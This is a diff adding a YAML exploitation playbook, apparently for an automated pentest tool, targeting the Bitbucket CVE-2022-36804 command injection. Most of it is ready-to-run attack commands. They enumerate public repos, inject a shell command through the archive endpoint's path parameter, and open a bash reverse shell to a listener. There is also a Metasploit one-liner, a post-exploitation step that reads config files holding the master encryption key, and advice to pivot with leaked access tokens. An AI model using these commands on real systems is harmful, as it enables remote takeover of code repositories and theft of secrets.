@@ -1,0 +1,63 @@
+chain_id: bitbucket_cve_2022_36804
+title: "Atlassian Bitbucket — CVE-2022-36804 command injection in archive endpoint"
+severity: CRITICAL
+tags: [web, bitbucket, atlassian, cve-2022-36804, command-injection, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-36804" }
+    - { banner_pattern: "(?i)bitbucket" }
+    - { product_pattern: "(?i)bitbucket" }
+    - { path_pattern: "(?i)/rest/api/latest/(repos|projects)/[^/]+/[^/]+/archive" }
+
+description: |
+  Bitbucket Server / Data Center 7.0–7.6, 7.7–7.16, 7.17–7.21,
+  8.0–8.3 lets an authenticated attacker (or anyone, on public-repo
+  instances) inject shell metacharacters via the `path` parameter of
+  the archive endpoint. Result: RCE as the bitbucket service user.
+  Public repos make it pre-auth.
+
+steps:
+  - id: 1
+    title: "Find a public project / repo (no creds needed if any exist)"
+    command: |
+      curl -sk "http://$VICTIMA:7990/rest/api/latest/projects" | jq -r '.values[].key'
+      curl -sk "http://$VICTIMA:7990/rest/api/latest/projects/PROJ/repos" | jq -r '.values[].slug'
+
+  - id: 2
+    title: "One-shot — id via archive endpoint"
+    command: |
+      curl -sk "http://$VICTIMA:7990/rest/api/latest/projects/PROJ/repos/REPO/archive?format=zip&path=%00--remote=`id`&prefix=ax" -o /tmp/out.zip
+      unzip -l /tmp/out.zip 2>&1 | grep -oE 'uid=[^[:space:]]+'
+
+  - id: 3
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl -sk "http://$VICTIMA:7990/rest/api/latest/projects/PROJ/repos/REPO/archive?format=zip&path=%00--remote=\`bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/4444 0>%261'\`&prefix=ax" -o /dev/null
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/atlassian_bitbucket_cmd_injection; \
+        set RHOSTS $VICTIMA; set RPORT 7990; set TARGETURI / ; \
+        set PROJECT PROJ; set REPO REPO; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Post — dump the master encryption key (signs JWTs etc.)"
+    command: |
+      cat /var/atlassian/application-data/bitbucket/shared/bitbucket.properties
+      cat /opt/atlassian/bitbucket/*/server/conf/bitbucket-config.properties 2>/dev/null
+
+common_errors:
+  - error: "401 Unauthorized — repos are private"
+    solution: |
+      Need read on at least one repo. Try anonymous access (some
+      builds allow it on `/scm/<proj>/<repo>.git`), or pivot via
+      cracked Bitbucket personal-access-tokens leaked in `.git/config`
+      across other projects.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-36804
+  - https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html
